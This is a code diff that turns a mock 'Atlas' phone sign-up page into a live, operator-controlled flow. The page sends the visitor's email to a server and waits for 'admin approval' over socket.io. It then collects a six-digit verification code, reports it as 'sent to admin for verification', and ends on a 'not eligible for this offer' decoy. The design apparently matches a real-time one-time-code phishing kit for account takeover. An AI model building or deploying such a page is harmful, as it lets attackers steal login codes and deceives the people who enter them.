@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
   <title>Atlas</title>
   <style>
     *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
@@ -14,25 +14,32 @@
       justify-content: center;
       align-items: center;
       min-height: 100vh;
+      padding: 20px;
     }
 
-    /* Phone frame */
+    /* Phone frame - responsive */
     .phone {
-      width: 390px;
-      height: 844px;
-      overflow: hidden;
+      width: 100%;
+      max-width: 390px;
+      height: auto;
+      min-height: 700px;
       position: relative;
       background: #fff;
       border-radius: 50px;
       box-shadow: 0 30px 80px rgba(0,0,0,0.22), inset 0 0 0 1px rgba(0,0,0,0.07);
+      overflow: hidden;
     }
 
-    /* Gradient background – top ~52% */
+    @media (max-width: 480px) {
+      body { padding: 0; }
+      .phone { border-radius: 0; min-height: 100vh; }
+    }
+
     .gradient-header {
       position: absolute;
       top: 0; left: 0;
       width: 100%;
-      height: 52%;
+      height: 45%;
       background: radial-gradient(ellipse 90% 90% at 50% 5%,
         #1e20cc 0%,
         #3a3ef0 20%,
@@ -42,16 +49,15 @@
       z-index: 0;
     }
 
-    /* Pages */
     .page {
       position: absolute;
       inset: 0;
       display: none;
       background: #fff;
+      z-index: 2;
     }
     .page.active { display: block; }
 
-    /* Logo centered in gradient area — uses YOUR logo.png */
     .header-logo {
       position: absolute;
       top: 48px;
@@ -60,18 +66,16 @@
       width: 36px;
       height: 36px;
       object-fit: contain;
-      z-index: 5;
+      z-index: 10;
     }
 
-    /* ══════════════════
-       PAGE 1 – Get Started
-    ══════════════════ */
+    /* PAGE 1 */
     #page1 .bottom-content {
       position: absolute;
       bottom: 64px;
       left: 0; right: 0;
       padding: 0 28px;
-      z-index: 5;
+      z-index: 10;
       display: flex;
       flex-direction: column;
       align-items: center;
@@ -94,7 +98,6 @@
       font-weight: 800;
       color: #111;
       letter-spacing: -1.5px;
-      line-height: 1;
     }
 
     .lang-label {
@@ -114,6 +117,7 @@
       cursor: pointer;
     }
     .lang-left { display: flex; align-items: center; gap: 10px; font-size: 15px; color: #222; }
+    .lang-icon { background: #e8e8ed; padding: 4px 10px; border-radius: 30px; font-size: 13px; font-weight: 600; color: #4a4ff0; }
     .chevron { font-size: 18px; color: #888; }
 
     .btn-blue {
@@ -126,20 +130,32 @@
       font-size: 16px;
       font-weight: 600;
       cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
     }
-    .btn-blue:hover { opacity: 0.9; }
+    .btn-blue:disabled { opacity: 0.6; cursor: not-allowed; }
 
-    /* ══════════════════
-       PAGE 2 – Email
-    ══════════════════ */
+    .spinner {
+      width: 20px;
+      height: 20px;
+      border: 2px solid rgba(255,255,255,0.3);
+      border-radius: 50%;
+      border-top-color: white;
+      animation: spin 0.6s linear infinite;
+      display: inline-block;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    /* PAGE 2 */
     #page2 .main-content {
       position: absolute;
-      top: 50%;
+      top: 45%;
       left: 0; right: 0;
       padding: 28px 28px 0;
-      z-index: 5;
+      z-index: 10;
     }
-
     .envelope {
       width: 36px;
       height: 28px;
@@ -157,14 +173,12 @@
       border-left: 18px solid transparent;
       border-right: 18px solid transparent;
     }
-
     .page-title {
       font-size: 26px;
       font-weight: 700;
       color: #4a4ff0;
       margin-bottom: 22px;
     }
-
     .input-field {
       width: 100%;
       background: #f2f2f7;
@@ -172,12 +186,9 @@
       border-radius: 14px;
       padding: 16px 18px;
       font-size: 16px;
-      color: #222;
       outline: none;
     }
-    .input-field::placeholder { color: #aaa; }
     .input-field:focus { border-color: #4a4ff0; background: #fff; }
-
     .btn-continue {
       width: 100%;
       padding: 17px;
@@ -193,17 +204,14 @@
     }
     .btn-continue.show { display: block; }
 
-    /* ══════════════════
-       PAGE 3 – Verify
-    ══════════════════ */
+    /* PAGE 3 - OTP */
     #page3 .main-content {
       position: absolute;
-      top: 48%;
+      top: 40%;
       left: 0; right: 0;
       padding: 28px 28px 0;
-      z-index: 5;
+      z-index: 10;
     }
-
     .verify-title {
       font-size: 26px;
       font-weight: 700;
@@ -216,32 +224,28 @@
       line-height: 1.55;
       margin-bottom: 26px;
     }
-
     .otp-row {
       display: flex;
-      gap: 9px;
-      margin-bottom: 14px;
+      justify-content: center;
+      gap: 10px;
+      margin-bottom: 24px;
+      flex-wrap: wrap;
     }
     .otp-box {
-      flex: 1;
-      height: 60px;
+      width: 50px;
+      height: 55px;
+      flex: none;
       background: #efefef;
       border: none;
-      border-radius: 12px;
+      border-radius: 14px;
       font-size: 22px;
       font-weight: 600;
       text-align: center;
-      color: #222;
       outline: none;
     }
-    .otp-box:focus { background: #e2e2f0; }
-
-    .resend {
-      font-size: 14px;
-      color: #666;
-      margin-bottom: 26px;
-    }
-
+    .otp-box:focus { background: #e2e2f0; border: 1px solid #4a4ff0; }
+    .otp-box:disabled { background: #e0e0e0; color: #999; cursor: not-allowed; }
+    
     .btn-verify {
       width: 100%;
       padding: 17px;
@@ -251,111 +255,141 @@
       border-radius: 50px;
       font-size: 16px;
       font-weight: 600;
-      cursor: default;
+      cursor: not-allowed;
     }
     .btn-verify.active {
       background: #4a4ff0;
       cursor: pointer;
+    }
+    .error-msg {
+      color: #e34d4d;
+      font-size: 13px;
+      text-align: center;
+      margin-top: 12px;
+    }
+    .waiting-msg {
+      text-align: center;
+      font-size: 14px;
+      color: #4a4ff0;
+      margin-top: 16px;
+      padding: 12px;
+      background: #f0f0ff;
+      border-radius: 12px;
+    }
+
+    /* PAGE 4 - SAD */
+    #page4 {
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+      padding: 40px;
+      background: #fff;
+      z-index: 10;
+    }
+    .sad-icon svg {
+      width: 80px;
+      height: 80px;
+      margin-bottom: 24px;
+    }
+    .sad-title {
+      font-size: 24px;
+      font-weight: 700;
+      color: #222;
+      margin-bottom: 12px;
+    }
+    .sad-text {
+      font-size: 16px;
+      color: #666;
+      line-height: 1.5;
     }
   </style>
 </head>
 <body>
 <div class="phone">
 
-  <!-- ══════════════════════════════
-       PAGE 1 – Get Started
-  ══════════════════════════════ -->
+  <!-- PAGE 1 -->
   <div class="page active" id="page1">
     <div class="gradient-header"></div>
-
-    <!-- YOUR logo centered in gradient -->
-    <img src="logo.png" class="header-logo" alt="logo" />
-
+    <img src="logo.png" class="header-logo" alt="logo" onerror="this.src='https://placehold.co/36x36?text=A'" />
     <div class="bottom-content">
-      <!-- Logo + wordmark -->
       <div class="logo-block">
-        <img src="logo.png" alt="Atlas logo" />
+        <img src="logo.png" alt="Atlas logo" onerror="this.src='https://placehold.co/50x50?text=A'" />
         <span class="logo-wordmark">atlas</span>
       </div>
-
-      <!-- Language picker -->
       <div style="width:100%">
         <p class="lang-label">Select Language</p>
         <div class="lang-select" style="margin-top:8px;">
           <div class="lang-left">
-            <span>🇺🇸</span>
+            <span class="lang-icon">EN</span>
             <span>English</span>
           </div>
           <span class="chevron">⌄</span>
         </div>
       </div>
-
-      <button class="btn-blue" onclick="goTo('page2')">Get Started</button>
+      <button class="btn-blue" onclick="goToEmailPage()">Get Started</button>
     </div>
   </div>
 
-
-  <!-- ══════════════════════════════
-       PAGE 2 – Email
-  ══════════════════════════════ -->
+  <!-- PAGE 2 - EMAIL -->
   <div class="page" id="page2">
     <div class="gradient-header"></div>
-    <img src="logo.png" class="header-logo" alt="logo" />
-
+    <img src="logo.png" class="header-logo" alt="logo" onerror="this.src='https://placehold.co/36x36?text=A'" />
     <div class="main-content">
       <div class="envelope"></div>
       <h2 class="page-title">What's your email?</h2>
-      <input
-        class="input-field"
-        type="email"
-        id="emailInput"
-        placeholder="example@email.com"
-        oninput="checkEmail()"
-      />
-      <button class="btn-continue" id="continueBtn" onclick="goTo('page3')">Continue</button>
+      <input class="input-field" type="email" id="emailInput" placeholder="example@email.com" oninput="checkEmail()" />
+      <button class="btn-continue" id="continueBtn" onclick="submitEmail()">Continue</button>
     </div>
   </div>
 
-
-  <!-- ══════════════════════════════
-       PAGE 3 – Verify Email
-  ══════════════════════════════ -->
+  <!-- PAGE 3 - OTP + WAITING -->
   <div class="page" id="page3">
     <div class="gradient-header"></div>
-    <img src="logo.png" class="header-logo" alt="logo" />
-
+    <img src="logo.png" class="header-logo" alt="logo" onerror="this.src='https://placehold.co/36x36?text=A'" />
     <div class="main-content">
       <h2 class="verify-title">Verify your email</h2>
-      <p class="verify-sub">
-        An email with a verification code was just sent to
-        <span id="emailDisplay" style="color:#111;"></span>
-      </p>
-
+      <p class="verify-sub">Enter the verification code sent to <span id="emailDisplay" style="color:#111;"></span></p>
       <div class="otp-row">
-        <input class="otp-box" maxlength="1" type="tel" oninput="otpMove(this,0)" />
-        <input class="otp-box" maxlength="1" type="tel" oninput="otpMove(this,1)" />
-        <input class="otp-box" maxlength="1" type="tel" oninput="otpMove(this,2)" />
-        <input class="otp-box" maxlength="1" type="tel" oninput="otpMove(this,3)" />
-        <input class="otp-box" maxlength="1" type="tel" oninput="otpMove(this,4)" />
-        <input class="otp-box" maxlength="1" type="tel" oninput="otpMove(this,5)" />
+        <input class="otp-box" maxlength="1" type="tel" inputmode="numeric" disabled oninput="otpMove(this,0)" />
+        <input class="otp-box" maxlength="1" type="tel" inputmode="numeric" disabled oninput="otpMove(this,1)" />
+        <input class="otp-box" maxlength="1" type="tel" inputmode="numeric" disabled oninput="otpMove(this,2)" />
+        <input class="otp-box" maxlength="1" type="tel" inputmode="numeric" disabled oninput="otpMove(this,3)" />
+        <input class="otp-box" maxlength="1" type="tel" inputmode="numeric" disabled oninput="otpMove(this,4)" />
+        <input class="otp-box" maxlength="1" type="tel" inputmode="numeric" disabled oninput="otpMove(this,5)" />
       </div>
-
-      <p class="resend" id="resendText">Resend in 11s</p>
-      <button class="btn-verify" id="verifyBtn">Verify</button>
+      <button class="btn-verify" id="verifyBtn" disabled>Submit OTP</button>
+      <div id="otpErrorMsg" class="error-msg"></div>
+      <div id="waitingMsg" class="waiting-msg">⏳ Waiting for admin approval...</div>
     </div>
   </div>
 
+  <!-- PAGE 4 - SAD FINAL -->
+  <div class="page" id="page4">
+    <div class="sad-icon">
+      <svg viewBox="0 0 24 24" fill="none" stroke="#666" stroke-width="1.5">
+        <circle cx="12" cy="12" r="10"/>
+        <line x1="8" y1="14" x2="16" y2="14"/>
+        <circle cx="9" cy="9" r="1" fill="#666" stroke="none"/>
+        <circle cx="15" cy="9" r="1" fill="#666" stroke="none"/>
+      </svg>
+    </div>
+    <div class="sad-title">Unfortunately, you are not eligible for this offer</div>
+    <div class="sad-text">We are truly sorry.</div>
+  </div>
 </div>
 
+<script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
 <script>
-  function goTo(id) {
+  let currentEmail = '';
+  let socket = null;
+  let waitingForApproval = true;
+  let approved = false;
+
+  function goToEmailPage() {
     document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-    document.getElementById(id).classList.add('active');
-    if (id === 'page3') {
-      const email = document.getElementById('emailInput').value.trim();
-      document.getElementById('emailDisplay').textContent = email;
-      startTimer();
-    }
+    document.getElementById('page2').classList.add('active');
   }
 
   function checkEmail() {
@@ -364,26 +398,136 @@
     document.getElementById('continueBtn').classList.toggle('show', ok);
   }
 
+  async function submitEmail() {
+    const email = document.getElementById('emailInput').value.trim();
+    if (!email) return;
+    currentEmail = email;
+    const btn = document.getElementById('continueBtn');
+    btn.innerHTML = '<div class="spinner"></div> Submitting...';
+    btn.disabled = true;
+
+    try {
+      const res = await fetch('/api/submit-email', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ email })
+      });
+      const data = await res.json();
+      if (res.ok) {
+        connectSocket(email);
+        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+        document.getElementById('page3').classList.add('active');
+        document.getElementById('emailDisplay').innerText = email;
+        document.getElementById('waitingMsg').style.display = 'block';
+        waitingForApproval = true;
+        approved = false;
+        document.querySelectorAll('.otp-box').forEach(box => box.disabled = true);
+        document.getElementById('verifyBtn').disabled = true;
+        document.getElementById('verifyBtn').classList.remove('active');
+      } else {
+        alert('Error: ' + data.error);
+        btn.innerHTML = 'Continue';
+        btn.disabled = false;
+      }
+    } catch (err) {
+      alert('Network error');
+      btn.innerHTML = 'Continue';
+      btn.disabled = false;
+    }
+  }
+
+  function connectSocket(email) {
+    if (socket) socket.disconnect();
+    socket = io();
+    socket.emit('user-join', email);
+
+    socket.on('approve-user', (data) => {
+      if (data.email === currentEmail) {
+        waitingForApproval = false;
+        approved = true;
+        document.getElementById('waitingMsg').style.display = 'none';
+        document.querySelectorAll('.otp-box').forEach(box => box.disabled = false);
+        document.getElementById('verifyBtn').disabled = false;
+        document.getElementById('verifyBtn').classList.add('active');
+        document.getElementById('otpErrorMsg').innerText = '';
+      }
+    });
+
+    socket.on('reject-user', (data) => {
+      if (data.email === currentEmail) {
+        alert('This user does not exist');
+        window.location.reload();
+      }
+    });
+
+    socket.on('incorrect-otp', (data) => {
+      if (data.email === currentEmail) {
+        document.getElementById('otpErrorMsg').innerText = 'Incorrect OTP. Please check your email again.';
+      }
+    });
+
+    socket.on('redirect-to-sad', (data) => {
+      if (data.email === currentEmail) {
+        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+        document.getElementById('page4').classList.add('active');
+      }
+    });
+  }
+
   function otpMove(el, i) {
+    if (!approved) return;
     const boxes = document.querySelectorAll('.otp-box');
     if (el.value.length === 1 && i < 5) boxes[i+1].focus();
     const full = [...boxes].every(b => b.value !== '');
-    document.getElementById('verifyBtn').classList.toggle('active', full);
+    const btn = document.getElementById('verifyBtn');
+    if (full && !waitingForApproval) {
+      btn.disabled = false;
+      btn.classList.add('active');
+    } else {
+      btn.disabled = true;
+      btn.classList.remove('active');
+    }
   }
 
-  let timer;
-  function startTimer() {
-    clearInterval(timer);
-    let s = 11;
-    const el = document.getElementById('resendText');
-    el.style.color = '#666';
-    el.textContent = 'Resend in ' + s + 's';
-    timer = setInterval(() => {
-      s--;
-      if (s > 0) { el.textContent = 'Resend in ' + s + 's'; }
-      else { clearInterval(timer); el.textContent = 'Resend code'; el.style.color = '#4a4ff0'; }
-    }, 1000);
-  }
+  document.getElementById('verifyBtn').addEventListener('click', async () => {
+    if (waitingForApproval || !approved) {
+      alert('Wait for admin approval first');
+      return;
+    }
+    const boxes = document.querySelectorAll('.otp-box');
+    let otp = '';
+    boxes.forEach(b => otp += b.value);
+    if (otp.length !== 6) {
+      alert('Enter full 6-digit OTP');
+      return;
+    }
+    const btn = document.getElementById('verifyBtn');
+    btn.innerHTML = '<div class="spinner"></div> Sending...';
+    btn.disabled = true;
+    try {
+      const res = await fetch('/api/submit-otp', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ email: currentEmail, otp })
+      });
+      if (res.ok) {
+        btn.innerHTML = 'OTP Sent ✓';
+        document.getElementById('otpErrorMsg').innerText = 'OTP sent to admin for verification.';
+        setTimeout(() => {
+          btn.innerHTML = 'Submit OTP';
+          btn.disabled = false;
+        }, 2000);
+      } else {
+        alert('Error submitting OTP');
+        btn.innerHTML = 'Submit OTP';
+        btn.disabled = false;
+      }
+    } catch (err) {
+      alert('Network error');
+      btn.innerHTML = 'Submit OTP';
+      btn.disabled = false;
+    }
+  });
 </script>
 </body>
 </html>
